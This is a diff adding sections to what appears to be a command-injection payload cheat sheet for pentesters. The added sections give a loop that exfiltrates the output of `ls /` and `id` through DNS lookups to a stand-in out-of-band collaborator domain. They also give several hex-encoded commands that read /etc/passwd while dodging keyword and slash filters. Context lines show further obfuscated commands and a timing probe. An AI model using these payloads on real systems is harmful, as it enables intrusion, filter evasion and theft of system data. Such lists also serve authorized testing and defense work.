@@ -82,6 +82,25 @@ who$(echo am)i               # builds whoami from a substring
 time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
 ```
 
+## DNS char-by-char exfil loop (when only an OAST DNS channel is back)
+
+```bash
+# each token of `ls /` becomes a DNS label under your collaborator subdomain
+for i in $(ls /); do host "$i.<token>.oast.tld"; done
+# nslookup variant for hosts without `host`
+for i in $(id); do nslookup "$i.<token>.oast.tld"; done
+```
+
+## Hex-encoded filename/command (keyword + slash both filtered)
+
+```bash
+# `cat /etc/passwd` with no literal slash/keyword on the wire
+cat `xxd -r -p <<< 2f6574632f706173737764`          # 2f6574632f706173737764 = /etc/passwd
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'; cat $abc
+`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`   # whole command hex-built
+```
+
 ## Tricks for unstable/timeout-killed channels
 
 ```bash
